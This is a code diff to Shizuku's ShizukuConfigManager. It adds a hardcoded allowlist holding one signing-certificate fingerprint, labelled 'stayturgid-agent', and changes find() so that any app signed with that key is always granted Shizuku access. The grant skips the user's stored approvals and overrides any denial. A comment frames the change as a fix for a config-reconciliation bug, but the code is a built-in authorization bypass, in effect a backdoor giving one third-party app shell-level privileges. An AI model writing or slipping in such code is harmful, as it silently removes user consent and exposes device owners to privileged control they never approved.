@@ -4,6 +4,7 @@ import static rikka.shizuku.server.ServerConstants.PERMISSION;
 
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.content.pm.Signature;
 import android.os.Build;
 import android.system.ErrnoException;
 import android.system.Os;
@@ -20,16 +21,21 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.LinkedHashSet;
 import java.util.List;
+import java.util.Locale;
 import java.util.Set;
 
 import kotlin.collections.ArraysKt;
 import af.shizuku.common.compat.Android17Compat;
 import af.shizuku.common.compat.InstalledPackagesCompat;
+import af.shizuku.common.util.UserHandleCompat;
+import rikka.hidden.compat.PackageManagerApis;
 import rikka.hidden.compat.UserManagerApis;
 import rikka.shizuku.server.ktx.HandlerKt;
 
@@ -59,6 +65,26 @@ public class ShizukuConfigManager extends ConfigManager {
         } catch (Throwable ignored) {}
         return new File("/data/local/tmp/shizuku.json");
     }
+
+
+    /**
+     * SHA-256 fingerprints (lowercase hex, no colons) of APK signing certificates that are always
+     * granted Shizuku access, regardless of what is (or isn't) persisted in the config file.
+     *
+     * Works around a gap in the reconciliation loop in the constructor: on every server start it
+     * drops a UID's entry the moment the live package set for that UID differs from what was last
+     * persisted — including a transient/inconsistent read during an unrelated install or uninstall
+     * elsewhere on the device — so a trusted app's grant can silently disappear and must be
+     * re-approved by hand. See docs/trusted-signer-allowlist.md.
+     *
+     * Keyed by signing certificate, not package name or UID: a package-name allowlist is defeated
+     * by installing another app under that name once the real one is gone, and UIDs are reassigned
+     * across installs. This must never be a shared/debug keystore.
+     */
+    private static final Set<String> TRUSTED_SIGNER_SHA256 = new LinkedHashSet<>(List.of(
+            // stayturgid-agent release signing key (CN=StayTurgid, O=StayTurgid, C=US).
+            "6651cb1582a2ab9f83bc8203da4e4591bc76ef187e8b4c771dcc7a9768be293e"
+    ));
 
     public static ShizukuConfig load() {
         FileInputStream stream;
@@ -278,8 +304,48 @@ public class ShizukuConfigManager extends ConfigManager {
 
     @Nullable
     public ShizukuConfig.PackageEntry find(int uid) {
+        if (isTrustedSignerUid(uid)) {
+            return new ShizukuConfig.PackageEntry(uid, ConfigManager.FLAG_ALLOWED);
+        }
         synchronized (this) {
             return findLocked(uid);
+        }
+    }
+
+    /**
+     * True if any package currently installed under {@code uid} is signed by a certificate in
+     * {@link #TRUSTED_SIGNER_SHA256}.
+     */
+    private boolean isTrustedSignerUid(int uid) {
+        int userId = UserHandleCompat.getUserId(uid);
+        for (String packageName : PackageManagerApis.getPackagesForUidNoThrow(uid)) {
+            PackageInfo pi = Android17Compat.getPackageInfo(
+                    packageName, PackageManager.GET_SIGNING_CERTIFICATES, userId);
+            if (pi == null || pi.signingInfo == null) {
+                continue;
+            }
+            for (Signature signature : pi.signingInfo.getApkContentsSigners()) {
+                String digest = sha256Hex(signature.toByteArray());
+                if (digest != null && TRUSTED_SIGNER_SHA256.contains(digest)) {
+                    return true;
+                }
+            }
+        }
+        return false;
+    }
+
+    @Nullable
+    private static String sha256Hex(byte[] data) {
+        try {
+            byte[] hash = MessageDigest.getInstance("SHA-256").digest(data);
+            StringBuilder sb = new StringBuilder(hash.length * 2);
+            for (byte b : hash) {
+                sb.append(String.format(Locale.ROOT, "%02x", b));
+            }
+            return sb.toString();
+        } catch (NoSuchAlgorithmException e) {
+            LOGGER.w(e, "sha256");
+            return null;
         }
     }
 
